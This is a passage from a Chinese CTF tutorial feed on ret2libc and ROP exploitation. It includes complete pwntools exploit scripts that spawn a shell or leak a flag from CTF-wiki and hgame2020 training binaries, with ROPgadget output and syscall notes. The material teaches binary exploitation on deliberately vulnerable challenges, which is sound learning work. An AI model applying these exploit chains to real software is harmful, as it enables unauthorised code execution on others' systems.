        <content type="html"><![CDATA[<h1 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Ret2libc，故名思意，return to libc,在PWN中即：修改返回地址使其指向libc中的shell</p><p>参考文章：<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a> </p><h2 id="0x10-Return2libc"><a href="#0x10-Return2libc" class="headerlink" title="0x10 Return2libc"></a>0x10 Return2libc</h2><p><em>－－修改返回地址，让其指向内存中已有的某个函数</em></p><p>根据上面副标题的说明，要完成的任务包括：在内存中确定某个函数的地址，并用其覆盖掉返回地址。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。下面就以执行 system(“/bin/sh”) 为例，先写出溢出数据的组成，再确定对应的各部分填充进去。</p><blockquote><p><strong>payload:</strong> padding1 + address of system() + padding2 + address of “/bin/sh”</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220145.png" alt=""></p><h2 id="0x20-return2libc-payload"><a href="#0x20-return2libc-payload" class="headerlink" title="0x20 return2libc  payload"></a>0x20 return2libc  payload</h2><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p><p>根据上面的构造，我们要解决个问题。</p><ol><li>返回地址之前的填充数据（padding1）应该多长？</li></ol><p>解决方法和 shellcode 中提到的答案一样。</p><ol><li>system() 函数地址应该是多少？</li></ol><p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p><p>最后，“/bin/sh” 的地址在哪里？</p><p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p><p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来通过 system() 打开 shell 了。</p><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>本题还是来源于ctf-wiki/challenges中的一道pwn题目：ret2libc3</p><p>程序源代码：</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <stdlib.h>#include <time.h>char buf2[100];void secure(void){    int secretcode, input;    srand(time(NULL));    secretcode = rand();    scanf("%d", &amp;input);    if(input == secretcode)        puts("no_shell_QQ");}int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf1[100];    printf("No surprise anymore, system disappeard QQ.\n");    printf("Can you find it !?");    gets(buf1);    return 0;}</time.h></stdlib.h></stdio.h></code></pre><p>程序开启NX保护，未开启栈保护与PIE（地址随机化）</p><p>file属性</p><pre class=" language-lang-txt"><code class="language-lang-txt">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped</code></pre><p>也就是说栈中的数据变得不可执行，我们不能通过填充shellcode到栈里来溢出</p><blockquote><p>那我们怎么才能pwn掉这个程序呢</p></blockquote><p>首先我们需要了解程序的POT表与GOT表，动态链接库，静态链接文件，等这些概念</p><p>我把这些整理到另一篇博客里面了，</p><p>也可以看这篇博客，我那篇ELF文件基础也是使用了他的部分内容</p><p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a></p><p>回到本题</p><p>与简单的pwn题不同的是，这道题没有提供system()函数，但我们要调用system(“bin/sh”)，才能获取到shell</p><p>并且程序开启了NX保护，我们不能通过填充Shellcode的方式来获取shell,</p><p>但通过我们前面了解到的知识，</p><pre class=" language-lang-txt"><code class="language-lang-txt">因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权，而libc.so动态链接库里的函数的偏移是固定的</code></pre><p>还有文件属性 <strong>dynamically linked</strong> </p><p>所以要解决这道题我们就要用到ret2libc的方法了</p><p>先说说这道题的利用思路</p><ol><li>程序提供了puts()函数，利用puts函数我们可以泄露出puts函数在GOT表中的地址，或者其他函数也行（程序里）</li><li>得到puts函数在GOT表中的地址以后，我们就可以根据地址的后三位来判断出libc的版本号，（后三位地址是不变的，无论怎么偏移）</li><li>利用泄露出来的puts()函数的地址-libc中puts()的偏移量=libc基础地址（算出libc基础地址）</li><li>system在libc中的偏移+libc的基础地址=system在程序中的位置</li><li>‘/bin/sh’的地址同理推出</li></ol><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">#泄露GOT表#payload= 'a'*offset + elf.plt['puts'] + returnaddr + elf.got['puts']payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])#puts在GOT表中的地址#接收4个字节puts_addr = u32(p.recv()[0:4])libc_base=puts_addr-libc.symbols['puts']system_addr=libc_base+libc.symbols['system']bin_addr=libc.base + libc.search('/bin/sh').next()payload='a'*offset +system_addr + returnaddr + bin_addr#payload=flat(['a*104',system_addr, 'bbbb',bin_addr])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *elf = ELF('./ret2libc3')sh  = process('./ret2libc3')libc=ELF('./libc6_2.23-0ubuntu10_i386.so')#返回到main函数在执行一次main函数payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])sh.sendlineafter('Can you find it !?', payload)puts_addr = u32(sh.recv()[0:4])libc_base=puts_addr-libc.symbols['puts']system_addr=libc_base+libc.symbols['system']bin_addr=libc_base + libc.search('/bin/sh').next()payload=flat(['a'*104, system_addr, 0x12345678 ,bin_addr])sh.sendline(payload)sh.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----ROP</title>
      <link href="/2020/02/18/ctf/pwn/pwn-rop/"/>
      <url>/2020/02/18/ctf/pwn/pwn-rop/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP  (Return Oriented Programming)"></a>ROP  (Return Oriented Programming)</h1><h2 id="0x00-ROP"><a href="#0x00-ROP" class="headerlink" title="0x00 ROP"></a>0x00 ROP</h2><p><em>－－修改返回地址，让其指向内存中已有的一段指令</em></p><p>根据上面副标题的说明，要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。可是既然可以覆盖返回地址并定位到内存地址，为什么不直接用上篇提到的 return2libc 呢？因为有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配。这时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造：</p><blockquote><p><strong>payload :</strong> <em>padding + address of gadget</em></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220132.png" alt=""></p><h2 id="0x10-包含单个-gadget-的溢出数据"><a href="#0x10-包含单个-gadget-的溢出数据" class="headerlink" title="0x10 包含单个 gadget 的溢出数据"></a>0x10 包含单个 gadget 的溢出数据</h2><p>如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( <strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n</p></blockquote><p>在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行 gadget 2，以此类推。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220143.png" alt=""></p><h2 id="0x20-包含多个-gadget-的溢出数据"><a href="#0x20-包含多个-gadget-的溢出数据" class="headerlink" title="0x20 包含多个 gadget 的溢出数据"></a>0x20 包含多个 gadget 的溢出数据</h2><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。</p><p>首先，栈溢出之后要实现什么效果？</p><p>ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是 int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中。例如，编号125对应函数</p><pre class=" language-lang-txt"><code class="language-lang-txt">mprotect (void *addr, size_t len, int prot)</code></pre><p>，可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p><p>其次，如何寻找对应的指令片段？</p><p>有若干开源工具可以实现搜索以 ret 结尾的指令片段，著名的包括 <strong>ROPgadget</strong>、<strong>rp++</strong>、<strong>ropeme</strong> 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 再进一步筛选。搜索的详细过程在这里就不再赘述，有兴趣的同学可以参考上述工具的说明文档。</p><p>最后，如何传入系统调用的参数？</p><p>对于上面提到的 mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在 gadget 地址之后，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220134.png" alt=""></p><h2 id="0x30-gadget-“pop-eax-ret-”"><a href="#0x30-gadget-“pop-eax-ret-”" class="headerlink" title="0x30 gadget “pop eax; ret;”"></a>0x30 gadget “pop eax; ret;”</h2><p>在调用 mprotect() 为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。但确定 shellcode 在内存的确切地址是很困难的事（想起上篇里面艰难试探的过程了吗？），我们可以使用 push esp 这个 gadget（加入可以找到的话）。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220133.png" alt=""></p><h2 id="0x40-gadget-“push-esp-ret-”"><a href="#0x40-gadget-“push-esp-ret-”" class="headerlink" title="0x40 gadget “push esp; ret;”"></a>0x40 gadget “push esp; ret;”</h2><p>我们假设现在内存中可以找到如下几条指令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;    # pop stack top into eaxpop ebx; ret;    # pop stack top into ebxpop ecx; ret;    # pop stack top into ecxpop edx; ret;    # pop stack top into edxint 0x80; ret;   # system callpush esp; ret;   # push address of shellcode</code></pre><p>对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + address of gadget n + shellcode</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220146.png" alt=""></p><h2 id="0x50-包含多个-gadget-的溢出数据（修改后）"><a href="#0x50-包含多个-gadget-的溢出数据（修改后）" class="headerlink" title="0x50 包含多个 gadget 的溢出数据（修改后）"></a>0x50 包含多个 gadget 的溢出数据（修改后）</h2><p>此处为了简单，先假定输入溢出数据不受“\x00”字符的影响，所以 payload 可以直接包含 “\x7d\x00\x00\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;         # pop stack top 0x1111118e into eaxpop ebx; ret;         # pop stack top 0x11111111 into ebxsub eax, ebx; ret;    # eax -= ebx</code></pre><p>解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。同时，由于 ROP 方法带来的灵活性，现在不再需要痛苦地试探 shellcode 起始地址了。回顾整个输入数据，只有栈的分段地址需要获取确定地址。如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了绕过内存随机化的可能。</p><p>出于演示的目的，我们假设（简直是<em>钦点</em>）了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。</p><p>第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop ebx; ret;</code></pre><p>但假如可以找到下面的 gadget</p><pre class=" language-lang-txt"><code class="language-lang-txt">mov ebx, eax; ret;</code></pre><p>我们就可以将它和</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;</code></pre><p>组合起来实现将数据传输给 ebx 的功能。上面提到的用多个 gadget 避免输入“\x00”也是一个实例应用。</p><p>第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心 gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。</p><h2 id="0x60-example1-easy"><a href="#0x60-example1-easy" class="headerlink" title="0x60 example1 (easy)"></a>0x60 example1 (easy)</h2><p>本题同样来自于CTF-wiki上的一道练习：ret2syscall</p><p>题目源码</p><pre class=" language-lang-c"><code class="language-lang-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char *shell = "/bin/sh";int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("This time, no system() and NO SHELLCODE!!!\n");    printf("What do you plan to do?\n");    gets(buf);    return 0;}</code></pre><p>程序开启NX保护==&gt;栈中数据不可执行</p><p>程序给了”/bin/sh”字符串</p><p>没有给出system()函数,静态链接文件</p><p>因此只能使用我们的ROP了，让程序跳到系统调用上</p><p>通过上面的知识我们可以知道我们可以通过构造gadget来实现操作</p><p>首先拟出我们需要的汇编指令</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret  0xbpop ebx; ret  /bin/shpop ecx; ret  0pop edx; ret  0int 80h</code></pre><p>使用ROPgadget 在程序中找出这些指令</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary rop --only "pop|ret"| grep ebx</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">0x080bb196 : pop eax ; ret0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret0x08049421 : int 0x80</code></pre><p>字符串bin/sh的地址在IDA中就可以查看，也可以通过ROPgadget —string查看</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x080BE408</code></pre><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload='a'*offset+ p32(0x080bb196) + p32(0xb) +p32(0x0806eb90)+ p32(0)+p32(0)+p32(0x080BE408)+p32(0x08049421)</code></pre><p>另一种解法：</p><p>直接生成ropchain</p><pre class=" language-lang-python"><code class="language-lang-python">from struct import pack# Padding goes herep = ''p += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea060) # @ .datap += pack('&lt;I', 0x080bb196) # pop eax ; retp += '/bin'p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea064) # @ .data + 4p += pack('&lt;I', 0x080bb196) # pop eax ; retp += '//sh'p += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x08054590) # xor eax, eax ; retp += pack('&lt;I', 0x0809a4ad) # mov dword ptr [edx], eax ; retp += pack('&lt;I', 0x080481c9) # pop ebx ; retp += pack('&lt;I', 0x080ea060) # @ .datap += pack('&lt;I', 0x0806eb91) # pop ecx ; pop ebx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x080ea060) # padding without overwrite ebxp += pack('&lt;I', 0x0806eb6a) # pop edx ; retp += pack('&lt;I', 0x080ea068) # @ .data + 8p += pack('&lt;I', 0x08054590) # xor eax, eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x0807b5bf) # inc eax ; retp += pack('&lt;I', 0x08049421) # int 0x80from pwn import *context.log_level="debug"sh=process('./rop')sh.sendlineafter("What do you plan to do?\n",'a'*112 + p)sh.interactive()</code></pre><p><strong>PS：本人在运行完这个脚本后虚拟机暴毙了，连着我一台kali还有我配置的pwn专用全部坏了，具体原因还没搞清，建议先拍个快照使用，或者放到docker里面跑，血的教训，还好里边没有什么重要的文件，难受！！</strong></p><p>报错如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">set_thread_area failed when setting up thread-local storage</code></pre><h2 id="0x70-example2-mid"><a href="#0x70-example2-mid" class="headerlink" title="0x70 example2(mid)"></a>0x70 example2(mid)</h2><p>本题来自于hgame2020 week1 pwn ROP_LEVEL0</p><pre class=" language-lang-TXT"><code class="language-lang-TXT">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // eax@1  char buf; // [sp+0h] [bp-50h]@1  int v6; // [sp+38h] [bp-18h]@1  int fd[2]; // [sp+48h] [bp-8h]@1  memset(&amp;buf, 0, 0x38uLL);  v6 = 0;  setbuf(_bss_start, 0LL);  v3 = open("./some_life_experience", 0);  *(_QWORD *)fd = v3;  read(v3, &amp;buf, 0x3CuLL);  puts(&amp;buf);  read(0, &amp;buf, 0x100uLL);  return 0;}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">__int64 vuln(){  char buf; // [sp+0h] [bp-10h]@1  read(0, &amp;buf, 0xA0uLL);  return 0LL;}</code></pre><p>题目提供两个函数，都是read()溢出,开启NX，无栈保护</p><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROP_LEVEL0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1baedaba8bde71a65a2f781f56a833ccd5388e24, not stripped</code></pre><p>64位可执行动态链接文件，64位文件溢出姿势 <a href="https://bbs.ichunqiu.com/article-1767-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-1767-1.html</a></p><p>这道题可以使用ret2libc的方法做，但在这里我们理解官方做法,官方EXP：</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p=process("./ROP_LEVEL0")#p = remote('47.103.214.163',20003)elf = ELF("ROP_LEVEL0")'''Gadgets information============================================================0x000000000040074c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040074e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400750 : pop r14 ; pop r15 ; ret0x0000000000400752 : pop r15 ; ret0x000000000040074b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040074f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop rbp ; ret0x0000000000400753 : pop rdi ; ret0x0000000000400751 : pop rsi ; pop r15 ; ret0x000000000040074d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004004c9 : ret0x0000000000400532 : ret 0x200a0x000000000040067e : ret 0x4804'''pop_rsi_r15_ret = 0x0000000000400751pop_rdi_ret = 0x0000000000400753read_plt = elf.plt['read']open_plt = elf.plt['open']puts_plt = elf.plt['puts']buf_addr = 0x601060#参考read的参数，要一个类似指针的bufpayload = 'a'*(0x50+8)    #栈溢出payload += p64(pop_rsi_r15_ret)+p64(buf_addr)+p64(0)    #buf值存入64位第二个传参寄存器rsipayload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(pop_rsi_r15_ret)+p64(0)*2    #调用read并填入参数payload += p64(open_plt)+p64(pop_rdi_ret)+p64(4)+p64(pop_rsi_r15_ret)+p64(buf_addr)*2    #调用open并填入参数payload += p64(read_plt)+p64(pop_rdi_ret)+p64(buf_addr)+p64(puts_plt)    #再次调用read读取flagp.sendline(payload)p.sendline('./flag\x00')p.interactive()</code></pre><h2 id="0x80-ROPgadget-命令"><a href="#0x80-ROPgadget-命令" class="headerlink" title="0x80 ROPgadget 命令"></a>0x80 ROPgadget 命令</h2><pre class=" language-lang-txt"><code class="language-lang-txt">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]                 [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]                 [--offset &lt;hexaddr&gt;] [--ropchain] [--thumb] [--console]                 [--norop] [--nojop] [--nosys] [--multibr] [--all]description:  ROPgadget lets you search your gadgets on a binary. It supports several   file formats and architectures and uses the Capstone disassembler for  the search engine.formats supported:   - ELF  - PE  - Mach-O  - Rawarchitectures supported:  - x86  - x86-64  - ARM  - ARM64  - MIPS  - PowerPC  - Sparcoptional arguments:  -h, --help           show this help message and exit  -v, --version        Display the ROPgadget's version  -c, --checkUpdate    Checks if a new version is available  --binary &lt;binary&gt;    Specify a binary filename to analyze  --opcode &lt;opcodes&gt;   Search opcode in executable segment  --string &lt;string&gt;    Search string in readable segment  --memstr &lt;string&gt;    Search each byte in all readable segment  --depth &lt;nbyte&gt;      Depth for search engine (default 10)  --only &lt;key&gt;         Only show specific instructions  --filter &lt;key&gt;       Suppress specific instructions  --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)  --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget's address  --rawArch &lt;arch&gt;     Specify an arch for a raw file  --rawMode &lt;mode&gt;     Specify a mode for a raw file  --offset &lt;hexaddr&gt;   Specify an offset for gadget addresses  --ropchain           Enable the ROP chain generation  --thumb              Use the thumb mode for the search engine (ARM only)  --console            Use an interactive console for search engine  --norop              Disable ROP search engine  --nojop              Disable JOP search engine  --nosys              Disable SYS search engine  --multibr            Enable multiple branch gadgets  --all                Disables the removal of duplicate gadgetsexamples:  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86   ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --ropchain  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --depth 3  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "main"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "m..n"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --opcode c9c3  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|ret"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|pop|xor|ret"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --filter "xchg|add|sub"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --norop --nosys  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --range 0x08041000-0x08042000  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string main --range 0x080c9aaa-0x080c9aba  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --memstr "/bin/sh"  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --console  ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --badbytes "00|7f|42"  ROPgadget.py --binary ./test-suite-binaries/Linux_lib64.so --offset 0xdeadbeef00000000  ROPgadget.py --binary ./test-suite-binaries/elf-ARMv7-ls --depth 5  ROPgadget.py --binary ./test-suite-binaries/elf-ARM64-bash --depth 5  ROPgadget.py --binary ./test-suite-binaries/raw-x86.raw --rawArch=x86 --rawMode=32</code></pre><h2 id="0x90-Linux-系统调用"><a href="#0x90-Linux-系统调用" class="headerlink" title="0x90 Linux 系统调用"></a>0x90 Linux 系统调用</h2><p>linux 的系统调用通过 int80 实现，用系统调用来区分入口函数</p><p>应用程序执行系统调用的过程是：</p><ol><li>把系统调用的编号存入EAX</li><li>把函数参数存入其他调用寄存器</li><li>触发 0x80 号中断</li></ol><p>那么我们如果只希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80h 就可以了</p><p>如果说通过系统调用执行的是：execve(“/bin/sh”,NULL,NULL)32位程序</p><p>那么EAX中存放的应该是系统调用的编号，查看execve的系统调用号</p><pre class=" language-lang-txt"><code class="language-lang-txt">cat /usr/include/asm/unistd_32.h |grep execve</code></pre><p>即0xb</p><p>其他：</p><pre class=" language-lang-txt"><code class="language-lang-txt">ebx /bin/shecx 0edx 0</code></pre><h2 id="0x100-汇编指令补充"><a href="#0x100-汇编指令补充" class="headerlink" title="0x100 汇编指令补充"></a>0x100 汇编指令补充</h2><p>一些最常用的汇编指令如下：</p><ul><li>MOV：数据传输指令，将 SRC 传至 DST，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">MOV DST, SRC;</code></pre><ul><li>PUSH：压入堆栈指令，将 SRC 压入栈内，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">PUSH SRC;</code></pre><ul><li>POP：弹出堆栈指令，将栈顶的数据弹出并存至 DST，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">POP DST;</code></pre><ul><li>LEA：取地址指令，将 MEM 的地址存至 REG ，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">LEA REG, MEM;</code></pre><ul><li>ADD／SUB：加／减法指令，将运算结果存至 DST，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">ADD/SUB DST, SRC;</code></pre><ul><li>AND／OR／XOR：按位与／或／异或，将运算结果存至 DST ，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">AND/OR/XOR DST，SRC;</code></pre><ul><li>CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">CALL PTR;</code></pre><ul><li>RET：返回指令，操作为将栈顶数据弹出至 eip，格式为</li></ul><pre class=" language-lang-txt"><code class="language-lang-txt">RET;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
